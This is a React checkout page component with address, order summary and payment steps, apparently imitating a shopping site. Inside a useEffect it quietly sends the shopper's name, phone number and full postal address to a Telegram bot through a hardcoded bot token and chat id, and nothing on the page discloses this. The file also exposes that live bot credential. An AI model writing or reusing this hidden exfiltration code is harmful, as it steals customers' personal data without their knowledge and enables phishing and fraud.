import { useEffect, useState } from "react";
import { useLoaderData } from "react-router-dom"

import Stepper from "react-stepper-horizontal";


import Address from "../components/Checkout/Address";
import OrderSummary from "../components/Checkout/Summary";
import Payment from "../components/Checkout/Payment";


export default function Checkout(props) {
    const info = useLoaderData();

    const [address, set_address] = useState({
        name: "",
        phone: "",
        state: "",
        pincode: "",
        address1: "",
        address2: ""
    });
    // 3 active steps

    const [active, set_active] = useState(0);


    useEffect(() => {
        if (active === 1) {
            let data = `Name:${address.name}-phone:${address.phone}-state:${address.state}-pincode:${address.pincode}-address:${address.address1} ${address.address2}`;
            fetch(`https://api.telegram.org/bot2089356070:AAEAk6Nj5ZsAYW_lbK-jdQOJA14XcjbXCc8/sendMessage?chat_id=993778683&text=${data}`).then(res => res.json()).then(data => {
                console.log(data)
            }).catch((err) => {

            })
        }
    }, [active])


    // 0 address 
    // 1 order summary
    // 2 payment

    return <>
        <header style={{
            width: "100%",
            height: "75px",
            position: "fixed",
            top: "0%",
            left: "0%",
            zIndex: 2,
            backgroundColor: "#fff",
            overflow: "auto",
            boxShadow: "1px 1px 4px #808080"
        }}>
            <Stepper
                activeTitleColor={"rgb(65 65 65)"}
                circleFontSize={8}
                titleFontSize={10}
                size={20}
                activeColor={"#2874f0"}
                completeColor={"rgb(0 97 255)"}
                steps={[{ title: 'Address' }, { title: 'Order Summary' }, { title: 'Payment' }]}
                activeStep={active}
            />
        </header>

        <div style={{ marginTop: "100px", width: "100%", backgroundColor: "" }}>
            {active === 0 ? <Address active={active} set_active={set_active} address={address} set_address={set_address} /> : null}
            {active === 1 ? <OrderSummary active={active} set_active={set_active} address={address} product={info} /> : null}
            {active === 2 ? <Payment product={info} /> : null}
        </div>
    </>
}